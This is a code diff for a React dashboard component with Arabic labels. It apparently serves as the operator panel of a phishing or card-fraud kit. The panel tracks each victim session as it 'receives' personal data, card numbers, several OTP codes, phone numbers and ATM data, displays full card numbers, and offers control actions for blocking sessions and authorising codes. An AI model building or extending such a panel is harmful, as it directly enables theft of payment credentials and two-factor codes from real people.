@@ -234,6 +234,7 @@ function SessionBox({
   const [expanded, setExpanded] = useState(false); // مغلقة افتراضياً
   const [historyExpanded, setHistoryExpanded] = useState(false);
   const [loadingAction, setLoadingAction] = useState<string | null>(null);
+  const [timeKey, setTimeKey] = useState(0); // For time refresh
 
   // Rows are already sorted by ID DESC (newest first) from parent useMemo
   const initialRow = rows.find((row) => row.type === "initial");
@@ -241,7 +242,6 @@ function SessionBox({
   const name = initialData.ownerName || "مستخدم";
   const phone = initialData.phone || "بدون هاتف";
   const cardRows = rows.filter((row) => row.type === "card");
-  // Use FIRST card (newest) since rows are sorted by ID desc
   const latestCard = cardRows[0];
   const cardData = parseData(latestCard?.data ?? null);
   const otpRows = rows.filter((row) => row.type.startsWith("otp"));
@@ -249,25 +249,35 @@ function SessionBox({
   const nomerRows = rows.filter((row) => row.type === "nomer");
   const nomerOtpRows = rows.filter((row) => row.type === "nomer_otp");
   const vehicleRows = rows.filter((row) => row.type === "vehicle");
-  // Use first row (newest) for lastActivity since rows are sorted desc by id
   const lastActivity = rows[0]?.createdAt;
 
-  // Build progress status
-  const progressSteps = [
-    { key: "initial", label: "تم ادخال بيانات", completed: !!initialRow },
-    { key: "card", label: "تم ادخال بطاقة", completed: cardRows.length > 0 },
-    { key: "otp", label: "تم ادخال رمز", completed: otpRows.length > 0 },
-    { key: "phone", label: "تم ادخال رقم هاتف", completed: nomerRows.length > 0 },
-    { key: "insurance", label: "تم اختيار تامين", completed: !!initialData.insuranceType },
-    { key: "vehicle", label: "تم ادخال تفاصيل مركبة", completed: vehicleRows.length > 0 },
-    { key: "nomerOtp", label: "تم ادخال رمز الهاتف", completed: nomerOtpRows.length > 0 },
-  ];
+  // Map types to Arabic labels
+  const typeLabels: Record<string, string> = {
+    "initial": "تم استلام البيانات الشخصية",
+    "card": "تم استلام بيانات البطاقة",
+    "otp": "تم استلام رمز التحقق",
+    "otp2": "تم استلام رمز التحقق الثاني",
+    "otp3": "تم استلام رمز التحقق الثالث",
+    "nomer": "تم استلام رقم الهاتف",
+    "vehicle": "تم استلام بيانات المركبة",
+    "nomer_otp": "تم استلام رمز التحقق الثاني",
+    "atm": "تم استلام بيانات ATM",
+  };
 
-  // Find the current step (last completed or current)
-  const currentStepIndex = progressSteps.findIndex(step => !step.completed);
-  const displaySteps = currentStepIndex === -1 
-    ? progressSteps.map((step, i) => ({ ...step, isCurrent: i === progressSteps.length - 1 }))
-    : progressSteps.map((step, i) => ({ ...step, isCurrent: i === currentStepIndex }));
+  // Build messages from actual received data (sorted by newest first)
+  const messages = rows.map((row) => ({
+    type: row.type,
+    label: typeLabels[row.type] || row.type,
+    createdAt: row.createdAt,
+  }));
+
+  // Refresh time display every second
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setTimeKey((k) => k + 1);
+    }, 1000);
+    return () => clearInterval(interval);
+  }, []);
 
   const statusBadge = blocked
     ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
@@ -280,10 +290,6 @@ function SessionBox({
   const formattedCard = latestCard && cardData.cardNumber
     ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
     : "—";
-
-  useEffect(() => {
-    setExpanded(cardRows.length > 0 || otpRows.length > 0);
-  }, [cardRows.length, otpRows.length]);
 
   const handleControl = async (action: string, code?: string, authorize?: boolean) => {
     setLoadingAction(action);
@@ -343,21 +349,22 @@ function SessionBox({
                   </div>
                 </div>
                 <div className="mt-2 flex items-center justify-between gap-2">
-                  <div className="flex items-center gap-1 flex-wrap">
-                    {displaySteps.map((step, index) => (
-                      <span
-                        key={step.key}
-                        className={`text-[10px] px-1.5 py-0.5 rounded-full ${
-                          step.completed
-                            ? "bg-green-100 text-green-700"
-                            : step.isCurrent
-                              ? "bg-blue-100 text-blue-700 animate-pulse"
-                              : "bg-slate-100 text-slate-400"
-                        }`}
-                      >
-                        {step.completed ? "✓" : "○"} {step.label}
+                  {/* Show latest message if exists */}
+                  <div className="flex items-center gap-2 flex-wrap">
+                    {messages.length > 0 ? (
+                      <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-green-100 text-green-700">
+                        ✓ {messages[0].label}
                       </span>
-                    ))}
+                    ) : (
+                      <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-slate-100 text-slate-400">
+                        جاري الانتظار...
+                      </span>
+                    )}
+                    {messages.length > 1 && (
+                      <span className="text-[10px] text-slate-400">
+                        +{messages.length - 1}
+                      </span>
+                    )}
                   </div>
                   <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                 </div>
@@ -381,6 +388,23 @@ function SessionBox({
 
         {expanded && (
           <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
+            {/* رسائل الاستلام - تظهر فقط ما وصل فعلاً */}
+            {messages.length > 0 && (
+              <div className="rounded-2xl bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 p-3">
+                <p className="text-[10px] font-semibold text-green-700 mb-2">الرسائل المستلمة</p>
+                <div className="space-y-1">
+                  {messages.map((msg, index) => (
+                    <div key={`${timeKey}-${index}`} className="flex items-center justify-between text-[11px]">
+                      <span className={`${index === 0 ? "text-green-700 font-semibold" : "text-green-600"}`}>
+                        ✓ {msg.label}
+                      </span>
+                      <span className="text-green-500 text-[10px]">منذ {formatAgo(msg.createdAt)}</span>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            )}
+
             {/* صندوق البيانات المركبة */}
             <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
               <p className="text-xs font-semibold text-slate-500 mb-3">بيانات المركبة</p>
